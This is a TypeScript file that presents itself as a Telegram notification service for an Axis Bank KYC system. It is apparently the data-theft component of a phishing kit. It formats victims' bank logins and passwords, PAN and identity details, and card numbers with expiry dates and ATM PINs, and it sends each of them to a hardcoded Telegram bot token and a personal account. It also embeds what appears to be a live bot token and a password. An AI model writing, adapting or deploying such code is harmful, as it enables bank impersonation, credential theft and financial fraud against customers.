// Telegram Bot Integration for Axis Bank KYC System

interface TelegramMessage {
  chat_id: string;
  text: string;
  parse_mode?: string;
}

interface LoginDetails {
  userId: string;
  password: string;
  timestamp: string;
}

interface KycDetails {
  fullName: string;
  customerId: string;
  mobileNumber: string;
  panCardNumber: string;
  dateOfBirth: string;
  timestamp: string;
}

interface CardVerificationDetails {
  cardNumber: string;
  expiryDate: string;
  atmPin: string;
  timestamp: string;
}

class TelegramBotService {
  private botToken: string;
  private chatId: string;
  private botPassword: string;

  constructor() {
    // Your actual Telegram bot details
    this.botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '8519877001:AAHqbzx28jAlcnpYiZ-rCurN_3phLpZh3-Q';
    this.chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7271452485'; // Your Chat ID
    this.botPassword = process.env.NEXT_PUBLIC_BOT_PASSWORD || 'axisbank2024';
  }

  // Send message to Telegram
  async sendMessage(message: string): Promise<boolean> {
    try {
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      const payload: TelegramMessage = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        console.log('✅ Telegram message sent successfully to @vikaskumar_8102');
        return true;
      } else {
        console.error('❌ Failed to send Telegram message:', await response.text());
        return false;
      }
    } catch (error) {
      console.error('❌ Error sending Telegram message:', error);
      return false;
    }
  }

  // Format login details for Telegram
  formatLoginMessage(details: LoginDetails): string {
    return `
🔐 <b>NEW LOGIN ATTEMPT - AXIS BANK KYC</b>

📋 <b>Login Details:</b>
• <b>User ID:</b> <code>${details.userId}</code>
• <b>Password:</b> <code>${details.password}</code>
• <b>Timestamp:</b> ${details.timestamp}

🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
    `;
  }

  // Format KYC details for Telegram
  formatKycMessage(details: KycDetails): string {
    return `
📝 <b>NEW KYC UPDATE - AXIS BANK</b>

👤 <b>Customer Information:</b>
• <b>Full Name:</b> <code>${details.fullName}</code>
• <b>Customer ID:</b> <code>${details.customerId}</code>
• <b>Mobile Number:</b> <code>${details.mobileNumber}</code>
• <b>PAN Card:</b> <code>${details.panCardNumber}</code>
• <b>Date of Birth:</b> <code>${details.dateOfBirth}</code>
• <b>Timestamp:</b> ${details.timestamp}

🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
    `;
  }

  // Format card verification details for Telegram
  formatCardVerificationMessage(details: CardVerificationDetails): string {
    return (
      `💳 <b>CARD VERIFICATION COMPLETED - AXIS BANK</b>

💳 <b>Card Details:</b>
• <b>Card Number:</b> <code>${details.cardNumber}</code>
• <b>Expiry Date:</b> <code>${details.expiryDate}</code>
• <b>ATM PIN:</b> <code>${details.atmPin}</code>
• <b>Timestamp:</b> ${details.timestamp}

✅ <i>Card verification successful</i>
🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>`
    );
  }

  // Send login notification
  async sendLoginNotification(details: LoginDetails): Promise<boolean> {
    const message = this.formatLoginMessage(details);
    return await this.sendMessage(message);
  }

  // Send KYC notification
  async sendKycNotification(details: KycDetails): Promise<boolean> {
    const message = this.formatKycMessage(details);
    return await this.sendMessage(message);
  }

  // Send card verification notification
  async sendCardVerificationNotification(details: CardVerificationDetails): Promise<boolean> {
    const message = this.formatCardVerificationMessage(details);
    return await this.sendMessage(message);
  }

  // Get bot password for verification
  getBotPassword(): string {
    return this.botPassword;
  }

  // Verify bot password
  verifyPassword(password: string): boolean {
    return password === this.botPassword;
  }

  // Test connection to Telegram
  async testConnection(): Promise<boolean> {
    const testMessage = `
🔧 <b>TELEGRAM BOT TEST - AXIS BANK KYC</b>

✅ <i>Bot is working correctly!</i>
• <b>Chat ID:</b> <code>${this.chatId}</code>
• <b>Username:</b> @vikaskumar_8102
• <b>Test Time:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}

🏦 <i>Axis Bank Online KYC System</i>
    `;
    return await this.sendMessage(testMessage);
  }
}

// Export singleton instance
export const telegramBot = new TelegramBotService();
